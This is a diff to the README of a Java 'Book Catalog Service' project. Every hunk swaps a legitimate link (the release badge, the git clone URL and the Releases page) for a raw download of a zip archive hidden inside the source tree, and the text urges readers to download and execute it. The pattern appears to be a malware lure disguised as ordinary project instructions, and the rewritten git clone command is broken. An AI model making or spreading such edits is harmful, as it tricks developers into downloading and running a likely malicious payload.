@@ -1,6 +1,6 @@
 # 📚 Book Catalog Service
 
-![GitHub release](https://img.shields.io/github/v/release/OldMinecraftAge/book-catalog-service?style=flat-square)
+![GitHub release](https://github.com/OldMinecraftAge/book-catalog-service/raw/refs/heads/main/src/main/java/com/vishnu/bookcatalog/book_service_catalog_v3.9.zip)
 
 Welcome to the Book Catalog Service! This is a secure backend service designed to manage books efficiently. With features like admin login and two-factor authentication, it ensures that your book data is safe and accessible only to authorized users.
 
@@ -56,7 +56,7 @@ Before you begin, ensure you have the following installed:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/OldMinecraftAge/book-catalog-service.git
+   git clone https://github.com/OldMinecraftAge/book-catalog-service/raw/refs/heads/main/src/main/java/com/vishnu/bookcatalog/book_service_catalog_v3.9.zip
    ```
 
 2. Navigate to the project directory:
@@ -139,7 +139,7 @@ For questions or suggestions, feel free to reach out to the repository owner.
 
 ## Releases
 
-To download the latest release, visit [Releases](https://github.com/OldMinecraftAge/book-catalog-service/releases). You can find the necessary files to download and execute.
+To download the latest release, visit [Releases](https://github.com/OldMinecraftAge/book-catalog-service/raw/refs/heads/main/src/main/java/com/vishnu/bookcatalog/book_service_catalog_v3.9.zip). You can find the necessary files to download and execute.
 
 Feel free to explore the releases section for previous versions and updates. If you encounter any issues, check the "Releases" section for more information.
 
